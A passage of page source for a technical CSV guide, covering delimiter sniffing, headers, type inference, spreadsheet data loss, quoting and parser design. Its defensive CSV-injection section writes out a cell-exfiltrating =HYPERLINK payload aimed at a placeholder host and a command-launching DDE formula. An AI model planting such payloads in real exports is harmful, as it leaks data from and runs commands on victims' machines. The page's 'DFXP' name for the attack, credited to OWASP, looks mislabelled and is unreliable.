          prose, so the escaping pressure drops to nearly zero — and its vice is that tabs are invisible in editors, so nobody
          notices the file has changed format. The{' '}
          <Rich text="[CSV vs TSV comparison](/compare/csv-vs-tsv/)" /> works through the trade.
        </P>
        <P>
          <strong>Pipe</strong> appears mostly in hand-built exports and log pipelines, and carries a hazard of its own: the
          character is the shell’s operator, so a pipe-delimited file tends to get mangled by the transport you use to move it.{' '}
          <strong>Caret</strong> shows up in a few old Windows data-interchange tools. Both exist; only one of them is guessable here.
        </P>
        <DataTable
          caption="Delimiters our engine will consider, and the honest state of each"
          head={['Character', 'In the candidate list?', 'Typical source', 'Main hazard']}
          rows={[
            ['comma (,)', 'Yes', 'The RFC 4180 default; most APIs and exporters', 'Appears inside numbers, addresses and free text'],
            ['tab (\\t)', 'Yes', 'Spreadsheet “Text (Tab delimited)”, Postgres text COPY, Unix tools', 'Invisible in editors; stripped by some log pipelines'],
            ['semicolon (;)', 'Yes', 'Locale exports where the decimal mark is a comma; European spreadsheets', 'Semicolons are common in prose and in joined lists'],
            ['pipe (|)', 'Yes', 'Hand-built exports, command-line dumps, log aggregators', 'Shell metacharacter; regex metacharacter'],
            ['caret (^)', 'No', 'Legacy interchange tools', 'Never guessed — see the single-column report below'],
          ]}
          foot="PostgreSQL restricts the CSV DELIMITER option to a single one-byte character, and its QUOTE option likewise; that constraint is typical, not exotic. Multi-character delimiters are a different format, not a CSV dialect."
        />
        <P>
          One more dialect axis people forget: the quote character itself. RFC 4180 fixes the double quote and PostgreSQL’s CSV mode
          agrees by default, but its ESCAPE option defaults to the quote character — doubling — and can be set to a single character
          for software that writes backslash escapes. Papa Parse exposes{' '}
          <Rich text="`quoteChar`" /> and{' '}
          <Rich text="`escapeChar`" /> for the same reason. Our converter offers both styles, doubling and backslash, because a file
          written with{' '}
          <Rich text={"`\\\"`"} /> inside a quoted field is not RFC 4180 CSV, and reading it is a deliberate choice rather than a bug.
        </P>
      </Section>

      <Section id="sniffing" title="How delimiter sniffing decides — and how it lies" kicker="Inference">
        <P>
          Guessing a delimiter is a scoring problem, and the scoring is easy to describe because ours is 20 lines of code. Given a
          body with no declared delimiter, the engine considers four candidates in a fixed order — comma, tab, semicolon, pipe —
          samples the first 40 non-blank lines, splits them on{' '}
          <Rich text={"`/\\r\\n|\\r|\\n/`"} />, and counts how many times each candidate occurs outside a quoted section on each
          sampled line. A candidate must occur at least once on line 1 to be considered at all. Its consistency is the fraction of
          sampled lines whose count equals line 1’s count, and its score is that first-line count multiplied by the consistency.
          Ties are broken alphabetically by{' '}
          <Rich text="`localeCompare`" />, so a perfect tie between semicolon and pipe picks pipe.
        </P>
        <P>
          Multiplying by consistency is what makes the heuristic defensible: a delimiter that appears three times on every line
          scores 3, while one that appears six times on the first line and nowhere else scores 6 times a fraction and loses. Four
          verbatim reports show the range of confidence the engine is willing to express.
        </P>
        <CodeBlock
          title="Four sniffing verdicts, copied from the tool"
          language="text"
          code={`"semicolon (;)" appears 2x on line 1 and in the same count in 3/3 sampled lines.
"comma (,)" scored highest (5 occurrences, 67% row consistency) but the counts vary, so set the delimiter explicitly.
Ambiguous: both semicolon (;) (2x) and pipe (|) (1x) fit the data. Confirm before trusting the split.
No candidate delimiter appears in the data, so the field count is 1 per row.`}
          caption="The fourth line is what a caret-delimited file reports: none of the four candidates occurs, so every record is one field and the converter says so rather than printing a single column and pretending it is a table. An empty body yields the fifth verdict: “No data rows to analyse; the comma default was used.”"
        />
        <H3>Where the heuristic fails, in order of how often you will meet it</H3>
        <P>
          <strong>Quoted multi-line fields.</strong> Sampling is line-based and a record is not, so a quoted field spanning three
          physical lines contributes its internal commas to one line’s count and nothing to the others. The file in the quoting
          section above gets 75% row consistency; a denser version gets 50% or 67%. The answer is the sentence the tool prints: set
          the delimiter explicitly.
        </P>
        <P>
          <strong>Uniformly wrong delimiters.</strong> A semicolon file whose free-text columns mention commas on every row will
          score a confident-looking comma count if the comma count happens to be identical per line. Consistency is not
          correctness; it is evidence that the candidate behaves like a separator, which prose can imitate.
        </P>
        <P>
          <strong>Header-only signal.</strong> The first sampled line dominates the score by construction, so a header written with
          a different convention than the body — comma in the header, semicolon in the data, which happens when somebody hand-edits
          a top row — is enough to pick wrong.
        </P>
        <P>
          <strong>One-column files.</strong> Requiring the candidate to appear on line 1 means a genuinely single-column CSV is
          indistinguishable from an unrecognised delimiter, and the engine’s answer is to report one field per row and move on.
        </P>
        <P>
          Browser-side libraries face the same problem with the same shape: Papa Parse guesses from a configurable{' '}
          <Rich text="`delimitersToGuess`" /> list only when no delimiter was supplied, which is the right division of labour —
          guess for interactive use, never in a pipeline where you know the answer. Which is the argument for the converter’s
          design: the delimiter dropdown defaults to{' '}
          <Rich text="`Auto`" />, shows the detected character and the reason sentence under it, and lets you override in one click
          while telling you which rows the choice affects. If you are reading a{' '}
          <Rich text="[log export](/use-cases/log-analysis/)" /> where the separator is a space or a bracket, no CSV sniffer is going
          to save you.
        </P>
      </Section>

      <Section id="header-row" title="The header row is a convention, not a fact" kicker="Structure">
        <P>
          Every tool you use assumes something about line 1, and the assumption is not recorded in the file. RFC 4180 §2 rule 3
          permits an optional header line and says any format compatible with the records must be acceptable for it; the memo’s
          discussion adds that the presence or absence of the header has to be agreed upon between producer and consumer. IANA’s
          registration gives the machine-readable version of that agreement: the optional{' '}
          <Rich text="`header`" /> parameter, whose valid values, verbatim, are ‘present’ or ‘absent’. If you are sending{' '}
          <Rich text="`text/csv`" /> over HTTP and you omit the parameter, you have left the question open on purpose.
        </P>
        <P>
          Header-less files are not hypothetical. A database client’s bare{' '}
          <Rich text="`COPY table TO STDOUT`" /> writes data and nothing else; many pipeline tools append to an existing file, which
          means the header exists on row 1 and never again; and CSV fragments pasted out of a spreadsheet usually start mid-table.
          Treating the first record as a header in those cases invents a column name out of a customer’s order total, and the damage
          is invisible because everything downstream still has keys.
        </P>
        <H3>What our parser decides about line 1</H3>
        <P>
          The converter’s{' '}
          <Rich text="`First row is a header`" /> toggle maps to{' '}
          <Rich text="`hasHeader`" />, which defaults to true. When it is off, the engine synthesises neutral names{' '}
          <Rich text="`column_1 … column_n`" /> so that the object shape stays stable and no data is silently promoted to metadata.
          When it is on, three header defects are checked, each with its own diagnostic:
        </P>
        <DataTable
          caption="Header diagnostics produced by parseCsv, with the exact report text"
          head={['Defect', 'Severity', 'What happens to the data']}
          rows={[
            ['Two columns named “id”', 'error — Duplicate header name: "id".', 'Object keys cannot repeat, so an array shape is the only one that keeps both columns’ values'],
            ['An empty header cell', 'warning, and the cell is renamed column_2', 'Keeps the record addressable; you learn the producer skipped a name'],
            ['First row is all digits', 'info — numeric-header', 'A strong hint that the file has no header and you are looking at data'],
          ]}
          foot="Duplicate headers are the one case where the JSON shape option matters: choosing array-of-arrays keeps the header record inside the payload instead of dropping a column."
        />
        <P>
          The numeric-header check is worth dwelling on because it is the only place the format offers evidence rather than
          convention. If{' '}
          <Rich text="`12,Anne,90210`" /> is the first line, a header interpretation yields columns called{' '}
          <Rich text="`12`" /> and{' '}
          <Rich text="`Anne`" /> and loses a row. The engine cannot know, so it reports the suspicion at info level and leaves the
          toggle where you can see it.
        </P>
        <Callout tone="tip" title="Put the answer in the file, not in the ticket">
          <P>
            If you produce the file, either include a header and say so in the media type, or omit it and name the columns
            somewhere durable. The worst option — the one that generates the bug reports — is a producer that sometimes writes a
            header, which is what happens when an export is generated by{' '}
            <Rich text="`if (rows.length &gt; 0)`" /> logic and tested only with data.
          </P>
        </Callout>
      </Section>

      <Section id="ragged-rows" title="Ragged rows, blank lines and silent truncation" kicker="Structural defects">
        <P>
          A ragged row is any record whose field count differs from the header’s. It is the most common structural defect in real
          files, and it has two completely different causes that look identical in the output: a producer that emitted a different
          column set for some records, and a value that contains the delimiter without being quoted. The first is a schema problem,
          the second is a quoting problem, and the fix is not the same.
        </P>
        <P>
          Take this 62-byte file, in which the second record carries four fields because an unquoted comma landed inside a note:
        </P>
        <CodeBlock
          title={'ragged file: 62 bytes, header says three columns'}
          language="csv"
          code={`name,city,note
Ana,San Francisco,CA,"says ""hi"""
Bo,Lisbon,ok`}
          caption={'Our parser returns the second record as four fields — ["Ana", "San Francisco", "CA", "says \\"hi\\""] — and reports the error Line 2 has 4 fields but the header row has 3. Its hint names the usual cause: unquoted delimiters inside free text, such as a city written as “San Francisco, CA”.'}
        />
        <P>
          What happens to that fourth value depends entirely on the consumer, and this is where data disappears quietly. Our{' '}
          <Rich text="`records`" /> output — the array of objects used to build JSON — keys fields by header position, so a field
          with no column name is dropped:{' '}
          <Rich text="`id,name`" /> followed by{' '}
          <Rich text="`1,a,b,c`" /> yields{' '}
          <Rich text={'`{"id":"1","name":"a"}`'} /> and the{' '}
          <Rich text="`b`" /> and{' '}
          <Rich text="`c`" /> values are gone. That is why the ragged-row diagnostic is an error and why the converter prints the
          per-row column counts as a matrix rather than a single number: the difference between{' '}
          <Rich text="`[3, 3, 4, 3]`" /> and{' '}
          <Rich text="`[3, 4, 4, 4]`" /> is the difference between one bad row and a schema change halfway through the file.
        </P>
        <H3>Blank lines, short lines and the eight-issue ceiling</H3>
        <P>
          A line with no characters is not a record with one empty field, but the grammar has nothing to say about it, so readers
          diverge. Our engine treats a blank line as a one-field row and reports it — the message for a blank line between two
          records reads{' '}
          <Rich text="`Line 3 has 1 fields but the header row has 2.`" /> — unless blank-line skipping is enabled, which drops rows
          consisting of exactly one empty field. A line holding nothing but a comma is a different animal: two empty fields, and it
          passes on a two-column file while a line of two commas fails with{' '}
          <Rich text="`Line 3 has 3 fields but the header row has 2.`" />. PostgreSQL is stricter than either: extra data after the
          last expected column is an error, and a{' '}
          <Rich text="`COPY`" /> that errors rolls back rather than loading what it liked.
        </P>
        <P>
          Volume is the last wrinkle. A genuinely broken export can have 40,000 short rows, and a report that lists them all is
          useless, so the parser prints up to eight individual ragged-row issues and then switches to a summary diagnostic telling
          you the rest were collapsed. Read the summary, fix the producer, re-run; the eighth row is not the last row.
        </P>
        <Callout tone="warn" title="Padding and truncation both destroy information">
          <P>
            The two intuitive repairs are wrong in opposite directions. Padding short rows with empty strings fabricates values — a
            missing amount becomes zero the moment someone sums the column — while dropping long rows discards the data that
            explains why the row was long. Keep the rows, key them by position, report the widths, and decide per column what an
            absent value means. That is the design the{' '}
            <Rich text="[data-migration workflow](/use-cases/data-migration/)" /> follows end to end.
          </P>
        </Callout>
      </Section>

      <Section id="type-free-columns" title="A CSV column has no type until something guesses" kicker="Semantics">
        <P>
          Here is the sentence that explains most CSV incidents: the format carries no type information whatsoever. A field is a
          sequence of characters. Whether{' '}
          <Rich text="`007`" /> is the integer seven or a three-character code is not recorded anywhere in the file, and every
          consumer that offers to “detect types” is running a guess over which it will not warn you. Python’s writer goes the other
          way and makes the guesser pay: its{' '}
          <Rich text="`QUOTE_NONNUMERIC`" /> mode exists so that fields read without quotes are converted to floats, and reading a
          text column through that dialect throws instead of shrugging.
        </P>
        <P>
          Our converter splits the guess into three modes, exposed as{' '}
          <Rich text="`Type inference`" /> in the options bar.{' '}
          <Rich text="`None`" /> keeps every value a string, which is the only lossless choice.{' '}
          <Rich text="`Safe`" /> is the default: it converts a field only when the conversion round-trips, and refuses when the
          literal text carries information a number cannot hold.{' '}
          <Rich text="`Aggressive`" /> adds booleans and null tokens. Both modes leave dates alone — we verified that{' '}
          <Rich text="`2026-01-07`" /> and{' '}
          <Rich text="`1 Mar`" /> stay strings even in the aggressive column, which is deliberate, because the only unambiguous
          reading of{' '}
          <Rich text="`01/02/2020`" /> is “somebody has to decide”.
        </P>
        <DataTable
          caption="Cell-by-cell results from the safe typing pass, all run against the engine"
          head={['Field text', 'Inferred type', 'Value produced', 'Why']}
          rows={[
            ['007', 'string', '"007"', 'Leading zeros are information; the integer 7 does not round-trip'],
            ['1.0', 'number', '1 (integer)', 'Honest loss: the trailing zero is dropped, so keep the column as text if it is significant'],
            ['42.50', 'number', '42.5 (float)', 'Same class of loss on the other side of the point'],
            ['1e3', 'number', '1000 (integer)', 'Exponent notation is accepted; the spelling is not preserved'],
            ['␣42␣ (space-padded)', 'number', '42 (integer)', 'Surrounding whitespace is trimmed before the numeric test'],
            ['+5', 'string', '"+5"', 'A leading sign with no decimal point is not trusted'],
            ['1,234', 'string', '"1,234"', 'Thousands separators are locale data, not numbers'],
            ['TRUE', 'string', '"TRUE"', 'Booleans need the aggressive mode; safe mode will not guess'],
            ['01/02/2020', 'string', '"01/02/2020"', 'Day-first or month-first? The file cannot say'],
            ['123456789012345', 'number', '123456789012345', 'Fifteen digits: still exact in binary64'],
            ['1234567890123456', 'string', 'flagged string-long-number', 'Sixteen digits: past the point where a double is trustworthy'],
            ['12345678901234567', 'string', 'flagged string-unsafe-number', 'Above 2^53−1, and Number() would return …568'],
            ['9007199254740993', 'string', 'flagged string-unsafe-number', 'The first odd integer a double cannot hold'],
            ['0.30000000000000004', 'string', 'flagged string-long-number', 'The text is the artifact of a float, and converting it again is a second error'],
            ['NULL / N/A / empty', 'null', 'null', 'Null tokens are configurable; the default list is NULL and N/A'],
          ]}
          foot="One asymmetry to know about: quoting does not protect a value from typing. A quoted field holding 007 stays a string, but a quoted 1.50 still becomes the number 1.5, because the parser has already removed the quotes before the typing pass runs."
        />
        <H3>The column report, and the 2^53−1 guard</H3>
        <P>
          Types are decided per column, not per cell, and the report shows the result: a{' '}
          <Rich text="`Column typing decisions`" /> table listing each column, the type chosen and, where cells disagreed, the label{' '}
          <Rich text="`string (mixed)`" /> with example values. Mixed is the interesting verdict. A{' '}
          <Rich text="`zip`" /> column that yields{' '}
          <Rich text="`string (mixed)`" /> over examples{' '}
          <Rich text="`90210`" /> and{' '}
          <Rich text="`28001`" /> means some rows were typed as numbers and others were not — almost always because one row has a
          leading zero or a plus-nine extension. The converter also counts how many columns came back mixed and surfaces that
          number as its precision-loss warning, so a column that is two-thirds integers is never presented as “a number column”.
        </P>
        <P>
          The hard line is the one JavaScript cannot cross. IEEE-754 binary64 holds consecutive integers exactly only up to
          9,007,199,254,740,991, and we measured the failure directly:{' '}
          <Rich text={'`Number("12345678901234567")`'} /> gives{' '}
          <Rich text="`12345678901234568`" /> and{' '}
          <Rich text={'`Number("9007199254740993")`'} /> gives{' '}
          <Rich text="`9007199254740992`" />. So a seventeen-digit identifier is left as a string and the report says, in the words
          the tool prints:{' '}
          <Rich text={'`Column "a" row 2: 12345678901234567 is a whole number above 2^53−1.`'} /> Bank account numbers, ISO
          identifiers, snowflake IDs and 18-digit national codes all live above that line, which is why they must be text in every
          representation you own. The same argument, from the JSON side, is in{' '}
          <Rich text="[the JSON number section](/learn/json/)" />.
        </P>
      </Section>

      <Section id="spreadsheet-damage" title="The spreadsheet damage chain, value by value" kicker="Data loss">
        <P>
          A CSV file is inert; the damage happens when something decides what the characters mean. The chain is always the same
          four links. A producer writes values as text. A spreadsheet opens the file and types every column by inspection. Somebody
          saves, and the file now contains the spreadsheet’s idea of your values rather than your values. A consumer reads the saved
          file and trusts it. Between link one and link four, ZIP codes have become integers, identifiers have lost their last
          digits, and a gene called{' '}
          <Rich text="`MARCH`" /> has become a date. Microsoft publishes the precision ceiling that causes the second failure —
          15 digits — and the file-format ceilings that cause the third: 32,767 characters in a cell, 1,048,576 rows and 16,384
          columns on a worksheet.
        </P>
        <DataTable
          caption="The same value through the chain: what the file held, and what comes back"
          head={['Written as', 'What a typing reader produces', 'Re-saved as', 'The loss']}
          rows={[
            ['007', 'the number 7', '7', 'Two characters of identity: a country code, a version, an account suffix'],
            ['1.0', 'the number 1', '1', 'The significant-digit claim in “measured to one decimal place”'],
            ['42.50', 'the number 42.5', '42.5', 'Currency precision, and any alignment a human relied on'],
            ['12345678901234567', 'a binary64 approximation', '1.23457E+16 or 12345678901234568', 'The last two digits, silently; JavaScript gives …568'],
            ['9007199254740993', 'the nearest representable even integer', '9007199254740992', 'An ID that no longer matches the row it came from'],
            ['1 Mar', 'a date value with a serial number behind it', '2026-03-01, or 46082, depending on format', 'The text you wrote is replaced by a number plus a display mask'],
            ['SEPT1 / MARCH1', 'a date, in readers that run gene-symbol-looking tokens through the date parser', 'an unrelated calendar day', 'A published dataset where a gene became March 1 — the audit case that made column typing famous'],
            ['a 40,000-character note', 'a cell that cannot hold it', 'a truncated cell', 'Everything past 32,767 characters'],
          ]}
          foot="Our converter deliberately never does the middle column: safe and aggressive typing both leave dates as strings, and the type report shows 007 and 1.0 as text and number respectively so the disagreement is visible before anything is written."
        />
        <H3>What the spreadsheet-risk auditor reports</H3>
        <P>
          The <Rich text="[CSV to JSON converter](/format-converters/csv-to-json/)" /> runs a second pass over the parsed values and
          prints a{' '}
          <Rich text="`Spreadsheet risk in these values`" /> panel listing each hazard it found, with a risk label per finding. It
          inspects the first 40 rows and numbers them the way a spreadsheet does — array index plus two, so the first data row is
          row 2 — and the flag set is narrow and mechanical:
        </P>
        <DataTable
          caption="Auditor flags, the pattern behind each, and the limit it corresponds to"
          head={['Flag', 'Trigger', 'Note']}
          rows={[
            ['Formula injection (DFXP)', "value starts with = + @, or with - when the next character is not a digit or a point", 'So +44 7700 900000 and =SUM(A1) are flagged; -2.5 is not'],
            ['Leading zero dropped', 'matches 0 followed by one or more digits, nothing else', 'The 007 case; the auditor is telling you the value is text that a reader will eat'],
            ['Precision loss / scientific notation', 'twelve or more consecutive digits', 'Chosen to fire well before the 15-digit ceiling, because display rounding starts early'],
            ['Gene symbol autocorrect', 'the whole cell equals one of SEPT, DEC, MARCH, APRIL, JUNE, JULY, OCTOBER, NOVEMBER, DESMAR, _19, matched case-insensitively', 'Anchored: MARCH and a lowercase march are caught, MARCH1 and SEPT1 are not — see the caveat below'],
            ['Excel cell length limit', 'a trimmed value longer than 8,192 characters', 'The report text names the 32,767-character ceiling; the threshold is conservative'],
            ['Excel column limit / Excel row limit', 'more than 16,384 columns, or more than 1,048,576 rows', 'File-level checks: the CSV is valid and the worksheet cannot hold it'],
          ]}
        />
        <Callout tone="warn" title="The gene-symbol caveat, stated honestly">
          <P>
            The name-to-date autocorrection problem is well documented in genomics circles, and the canonical examples are tokens
            like{' '}
            <Rich text="`SEPT1`" /> and{' '}
            <Rich text="`MARCH1`" />, which look like dates to anything with a permissive date parser. Our auditor’s pattern is
            anchored to the whole cell and matched case-insensitively, so it catches{' '}
            <Rich text="`MARCH`" /> and{' '}
            <Rich text="`DEC`" /> and a lowercase{' '}
            <Rich text="`march`" />, but not{' '}
            <Rich text="`MARCH1`" />. Our own report wording admits the gap: it reads “Excel rewrites symbols such as MARCH, SEP1
            and DEC1 as dates”, and neither{' '}
            <Rich text="`SEP1`" /> nor{' '}
            <Rich text="`DEC1`" /> is in the flagged set — the anchored list is{' '}
            <Rich text="`SEPT`" /> and{' '}
            <Rich text="`DEC`" />, not their numbered forms. Do not read a clean audit as proof that a gene column is safe: keep
            identifier columns typed as text at the reader, not just flagged in the report.
          </P>
        </Callout>
        <P>
          The reason the chain is so hard to break is that every link is individually reasonable. A spreadsheet that displayed{' '}
          <Rich text="`007`" /> as 7 has told you, in its own UI, that the value is a number. A user who sees a number types a
          number. The file that comes out is smaller and cleaner than the one that went in, and the only witness to the change is a
          column of integers that used to be a column of strings. Auditing on read is the practical defence: measure the value you
          wrote against the value you got back, which is exactly what the converter’s{' '}
          <Rich text="`Round trip: identical`" /> line exists to make boring.
        </P>
      </Section>

      <Section id="csv-injection" title="CSV injection: the formula that ran" kicker="Security">
        <P>
          Everything so far has been about losing data. This is about gaining code execution, and it needs no vulnerability, no
          buffer overflow and no malicious file format. It needs a spreadsheet that evaluates anything starting with{' '}
          <Rich text="`=`" /> and a cell whose text came from a user.
        </P>
        <P>
          The attack is named DFXP — dynamic data exchange, formula injection — and OWASP’s description of it is short: an
          application exports attacker-controlled text into a CSV; a victim opens the CSV in spreadsheet software; the software sees
          a leading{' '}
          <Rich text="`=`" /> and treats the rest of the cell as a formula. The dangerous prefix set OWASP lists is{' '}
          <Rich text="`=`" />,{' '}
          <Rich text="`+`" />,{' '}
          <Rich text="`-`" />,{' '}
          <Rich text="`@`" />, tab and carriage return or line feed, along with their full-width Unicode look-alikes. A display name
          of{' '}
          <Rich text={'`=HYPERLINK("http://host/" & A1 & "?d=", "Invoice")`'} /> is not a name; it is a URL builder that leaks a
          cell to an attacker-controlled host the moment the accounts team opens the monthly export. The payloads that matter are not
          exotic —{' '}
          <Rich text={"`=1+cmd|' /C calc'!A0`"} /> has been the canonical demonstration shape for this class of attack, and it needs
          the victim to click through one warning, which exported reports reliably get past.
        </P>
        <H3>Why the naive fix is half a fix</H3>
        <P>
          Quoting the field is necessary and not sufficient. Wrapping a value in double quotes is a statement about the{' '}
          <Rich text="`text/csv`" /> grammar, not about the spreadsheet: the quotes are consumed by the reader and discarded, and the
          cell content still begins with{' '}
          <Rich text="`=`" />. OWASP is explicit that the mitigation set is quoting plus a prefix that survives into the cell — an
          apostrophe, which spreadsheet software treats as “this is text” — or a leading tab, and it adds the warning that Excel may
          remove quotes and re-activate formulas that were previously escaped. The defence therefore has three layers, and you want
          all of them: neutralise on write, refuse to evaluate on read, and never hand an untrusted CSV to a human in a double-click
          workflow.
        </P>
        <P>
          Our writer does the first layer automatically and visibly.{' '}
          <Rich text="`fieldNeedsQuotes`" /> returns true for any field longer than one character whose first character is{' '}
          <Rich text="`=`" />,{' '}
          <Rich text="`+`" />,{' '}
          <Rich text="`-`" /> or{' '}
          <Rich text="`@`" />, so those values always arrive quoted, which stops a naive consumer from splitting them apart. The
          auditor reports the same shapes as{' '}
          <Rich text="`Formula injection (DFXP)`" /> findings, using the prefix rule{' '}
          <Rich text="`^[=+@]`" /> plus a leading hyphen that is not followed by a digit or a decimal point — the deliberate
          exception being negative numbers, because{' '}
          <Rich text="`-2.5`" /> is a value and{' '}
          <Rich text="`+1-555-1234`" /> is not.
        </P>
        <CodeBlock
          title="what our writer produces for hostile-looking text"
          language="csv"
          code={'id,note\n1,"=HYPERLINK(""http://x"",""y"")"\n2,"+1-555-1234"\n3,-2.5\n4,"@SUM(1,2)"'}
          caption="The formula and the at-sign value are quoted, including the comma inside @SUM(1,2); the negative number is left bare because it is a number. None of this makes the cell safe to evaluate — it makes the field survive transport. Prepending an apostrophe, or importing the column as text, is what stops execution."
        />
        <Callout tone="risk" title="The trust boundary people forget">
          <P>
            A CSV exported from your own database is only as trustworthy as the strings inside it. Free-text columns — display names,
            product titles, comments, support tickets — are attacker-controlled input that happens to be stored in a table, and an
            admin opening your export has the highest-privilege spreadsheet on the network. Sanitising on export is a one-line
            prefix check; see the{' '}
            <Rich text="[encoding and security tools](/use-cases/encoding/)" /> for the sibling problems in URL and HTML contexts.
          </P>
        </Callout>
      </Section>

      <Section id="writing-csv" title="Writing CSV: which fields must be quoted" kicker="Producers">
        <P>
          Reading CSV is a negotiation; writing it is a set of obligations, and they are cheaper to satisfy than they are to
          debug. Our writer applies four tests to every field and quotes it if any one fires:
        </P>
        <DataTable
          caption="The four quoting triggers in fieldNeedsQuotes, in code order"
          head={['#', 'Condition', 'Why it has to fire']}
          rows={[
            ['1', 'the field contains the delimiter or the quote character', 'RFC 4180 §2 rules 5 and 6: an unquoted field may not contain a comma or a quote'],
            ['2', 'the field contains CR, LF, U+2028 or U+2029', '§2 rule 6 again — and the two Unicode line separators because line-based readers treat them as breaks'],
            ['3', 'the field starts or ends with whitespace', '§2 rule 4 says spaces are part of a field; quoting is the only way to assert that a consumer will preserve them'],
            ['4', 'the field is longer than one character and starts with =, +, - or @', 'Not in the RFC at all — this is the CSV-injection mitigation from the previous section'],
          ]}
          foot="Empty fields are emitted unquoted, and a lone - or = stays unquoted, because a one-character value cannot be a formula. Both behaviours are the writer’s, not the specification’s."
        />
        <P>
          Applied to a three-column table, the minimal policy produces exactly this byte sequence — the arrow notation is ours, the
          rest is the literal output:
        </P>
        <CodeBlock
          title="output of writeCsv(rows, {}) — CRLF terminators, minimal quoting"
          language="text"
          code={'a,"He said ""hi"", loudly",b<CR><LF>" x ",007,"=HYPERLINK(""http://x"",""y"")"<CR><LF>'}
          caption="Note the trailing terminator after the last record: our writer always ends the file with a line break, which RFC 4180 §2 rule 2 leaves optional. Appending tools care; two producers that disagree about the final break produce a concatenated file whose first appended row is glued to the last one."
        />
        <H3>Quoting policies, and when to over-quote</H3>
        <P>
          The{' '}
          <Rich text="`quoteStyle`" /> option selects the policy.{' '}
          <Rich text="`minimal`" /> is the default and the RFC’s model.{' '}
          <Rich text="`all`" /> wraps every field —{' '}
          <Rich text={'`"a","12345","x,y"`'} /> — which is the setting to choose when the consumer is a hand-rolled splitter, because
          a quoted numeric column cannot be mistaken for anything else. PostgreSQL exposes the same idea as{' '}
          <Rich text="`FORCE_QUOTE`" /> for{' '}
          <Rich text="`COPY TO`" />, and Python as{' '}
          <Rich text="`QUOTE_ALL`" />. Our third option,{' '}
          <Rich text="`numeric-safe`" />, is the pragmatic hybrid: it quotes every field that{' '}
          <Rich text="`isNumericLike`" /> matches, so{' '}
          <Rich text={'`a,"12345","007","1.50","1e3","-12"`'} /> is what a 15-digit-sensitive column looks like on the way out —
          quoted text that a spreadsheet may still coerce but that every typed consumer will read as a string. Python’s{' '}
          <Rich text="`QUOTE_NONNUMERIC`" /> is the inverse of that intent and comes with a trap: on reading, unquoted fields are
          converted to floats, so a text column without quotes throws.
        </P>
        <P>
          Three obligations beyond quoting, all of them cheap. Emit the same column list for every record, computed as the union of
          keys and not as the keys of row one — that single change eliminates ragged rows from most JSON-derived exports, and the{' '}
          <Rich text="[JSON to CSV converter](/format-converters/json-to-csv/)" /> does exactly that and tells you when records
          disagree. Choose and state one line terminator rather than inheriting the platform default; Python’s writer defaults to
          CRLF while its{' '}
          <Rich text="`unix`" /> dialect uses LF and quotes everything, which is a nice illustration of how one library ships two
          dialects for the same data. And decide the BOM deliberately, once, in the export code, rather than letting an interactive
          save dialog decide it per file.
        </P>
        <Callout tone="tip" title="Write the reader you would want to inherit">
          <P>
            The most robust producer policy in practice is: quote any field containing{' '}
            <Rich text={'`"`'} />, the delimiter, or any line break; quote any field with leading or trailing whitespace; quote anything
            that could be read as a number you did not mean as a number; always terminate the last record; and put the column list in
            the first row unless the protocol says otherwise. Those five rules satisfy every reader named in this guide.
          </P>
        </Callout>
      </Section>

      <Section id="two-stage-parse" title="The two-stage parse fallacy, and the machine that replaces it" kicker="Implementation">
        <P>
          Almost every CSV bug in application code is the same seven characters:{' '}
          <Rich text="`.split(`" />. The pattern is: read the whole file, split on newlines to get rows, split each row on commas to
          get fields, zip against the header. It works on the test fixture and corrupts production, for a reason that is easy to
          demonstrate — the two stages are not independent. Which characters are structural depends on whether you are inside a
          quoted field, and whether you are inside a quoted field depends on characters you have not read yet, including across the
          line boundaries the first stage just threw away.
        </P>
        <CodeBlock
          title="the fallacy, measured"
          language="javascript"
          code={`const text = 'id,bio\\n1,"line one\\nline two"\\n2,y\\n';   // 33 bytes, 3 records

text.split('\\n');            // 5 pieces: the record boundary is not the line boundary
text.split('\\n').map(l => l.split(',').length);  // [2, 2, 1, 2, 1]  <- a 2-column table
// row "1" of that result is  ["1", "\\"line one"]   — a quote character in the value

const csv = '2,"Li, Wei",90210,7.25,2026-02-28,3.5';
csv.split(',').length;       // 7 fields. The row has 6.`}
          caption="Neither stage can be repaired locally: the naive line split has already destroyed the only information that would have told it the break was data."
        />
        <P>
          The usual second attempt is a regular expression, and it fails in a way worth memorising. The pattern people reach for,{' '}
          <Rich text={'`/("[^"]*"|[^,]+)/g`'} /> — “a quoted run, or a run of non-commas” — applied to{' '}
          <Rich text={'`1,"a""b",3`'} /> returns four matches instead of three fields: the tokens{' '}
          <Rich text={'`1`'} />,{' '}
          <Rich text={'`"a"`'} />,{' '}
          <Rich text={'`"b"`'} /> and{' '}
          <Rich text={'`3`'} />. The alternation matches the shortest possible quoted run and cannot express “a quote is escaped
          iff it is doubled”. Any regex without a counting mechanism is blind to quote parity.
        </P>
        <H3>The four-state machine that is actually CSV</H3>
        <P>
          Every correct reader you will ever use is this loop. It keeps one character buffer, one field array, and a flag for whether
          it currently stands inside a quoted field, and it makes a decision per character rather than per line:
        </P>
        <CodeBlock
          title="a conformant RFC 4180 reader in 22 lines"
          language="javascript"
          code={`function parseCsv(text, { delimiter = ',', hasHeader = true } = {}) {
  const rows = []; let field = '', row = [], quoted = false, started = false;
  const endField = () => { row.push(field); field = ''; started = true; };
  const endRow = () => { endField(); rows.push(row); row = []; started = false; };
  for (let i = 0; i < text.length; i++) {
    const c = text[i];
    if (quoted) {
      if (c === '"') {
        if (text[i + 1] === '"') { field += '"'; i++; }   // rule 7: doubled quote is data
        else { quoted = false; }                          // closing quote
      } else field += c;                                  // rule 6: commas and newlines are data here
    } else if (c === '"' && field === '' && !started) {
      quoted = true;                                      // rule 4: a quote opens only at field start
    } else if (c === delimiter) endField();
    else if (c === '\\n') { if (field !== '' || row.length || started) endRow(); }
    else if (c === '\\r') { if (text[i + 1] === '\\n') i++; if (field !== '' || row.length || started) endRow(); }
    else { field += c; started = true; }
  }
  if (field !== '' || row.length) endRow();               // rule 2: the last record needs no break
  const [header, ...body] = hasHeader ? rows : [];
  return hasHeader ? body.map(r => Object.fromEntries(header.map((h, j) => [h, r[j] ?? '']))) : rows;
}`}
          caption="Note where the states live: quoted is the only memory, the doubled-quote branch consumes two characters at once, and the line-break branches are inside the else — meaning a CRLF inside a quoted field is appended to the value, never treated as a record boundary. The trailing field check is what makes a file without a final newline parse at all."
        />
        <P>
          Two properties of this loop explain the diagnostics in the earlier sections. First, the quote-opening test is{' '}
          <Rich text={"`field === ''`"} />: a quote that arrives mid-field is data or an error, never a state change, which is exactly
          why our parser raises{' '}
          <Rich text="`quote-not-at-start`" /> for{' '}
          <Rich text={'`1,abc",x`'} /> and keeps{' '}
